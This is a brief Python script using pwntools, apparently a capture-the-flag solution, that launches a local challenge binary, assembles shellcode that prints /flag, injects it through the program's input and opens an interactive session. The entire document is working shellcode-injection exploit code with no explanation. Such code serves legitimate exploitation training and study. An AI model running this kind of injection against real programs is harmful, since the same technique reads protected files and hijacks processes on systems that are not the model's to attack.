from pwn import *
context(os='linux', arch='amd64', log_level='debug')
p=process("/challenge/binary-exploitation-nopsled-shellcode")
shellcode=shellcraft.cat("/flag")
payload=asm(shellcode)
print("[+]Shellcode:",payload)
p.sendafter("stdin.\n\n",payload)
print(p.recv())
p.interactive()
